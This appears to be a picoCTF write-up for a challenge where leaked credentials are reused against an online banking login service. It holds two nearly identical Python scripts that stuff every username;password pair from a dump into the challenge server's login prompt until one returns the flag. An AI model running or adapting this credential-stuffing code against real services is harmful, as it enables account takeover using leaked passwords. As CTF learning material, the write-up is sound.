![image](https://hackmd.io/_uploads/HJZcFHLsWl.png)

-- At first, download the credentials dump by click [here](https://challenge-files.picoctf.net/c_crystal_peak/d95212c879165808903da2be8aa8f9f8ad7577549d0101f90d9280762a08e713/creds-dump.txt)
-- The description said we need to reuse the crendentials from another leaked source in order to login Online Banking Service
$\implies$ Generate a python script to brute-force the correct `username;password`
-- Because the 'wordlist' is too long, I had an idea to create 2 script, indeed, the first one will check the credentials ascendingly and the other go from the bottom

<details>
    <summary>Ascending ⏬</summary>

```python!
import socket

HOST = "crystal-peak.picoctf.net"
PORT = 49832

def recv_until(sock, text):
    data = b""
    while text.encode() not in data:
        chunk = sock.recv(1024)
        if not chunk:
            break
        data += chunk
    return data

with open("creds-dump.txt") as f:
    for line in f:
        username, password = line.strip().split(";")

        try:
            s = socket.socket()
            s.connect((HOST, PORT))

            recv_until(s, "Username:")
            s.sendall((username + "\n").encode())

            recv_until(s, "Password:")
            s.sendall((password + "\n").encode())

            # đọc full response
            result = b""
            while True:
                chunk = s.recv(1024)
                if not chunk:
                    break
                result += chunk

            result = result.decode()

            print(f"[+] Tried {username}:{password}")

            if "picoCTF{" in result:
                print("FOUND:", username, password)
                break

            s.close()

        except Exception as e:
            print("Error:", e)
```
    
</details>

<details>
    <summary>Descending ⏫</summary>

```pyth!
import socket

HOST = "crystal-peak.picoctf.net"
PORT = 49832

def recv_until(sock, text):
    data = b""
    while text.encode() not in data:
        chunk = sock.recv(1024)
        if not chunk:
            break
        data += chunk
    return data

with open("creds-dump.txt") as f:
    lines = f.readlines()[::-1]

    for line in lines:
        username, password = line.strip().split(";")

        try:
            s = socket.socket()
            s.connect((HOST, PORT))

            recv_until(s, "Username:")
            s.sendall((username + "\n").encode())

            recv_until(s, "Password:")
            s.sendall((password + "\n").encode())

            # đọc full response
            result = b""
            while True:
                chunk = s.recv(1024)
                if not chunk:
                    break
                result += chunk

            result = result.decode()

            print(f"[+] Tried {username}:{password}")

            if "picoCTF{" in result:
                print("FOUND:", username, password)
                break

            s.close()

        except Exception as e:
            print("Error:", e)
```
    
</details>

-- Run the script with the `creds-dump.txt` 
```
python3 pico_asc.py
python3 pico_desc.py
```
-- Correct credentials successfully found almost at the same time
![image](https://hackmd.io/_uploads/BkM7RrUoWx.png)
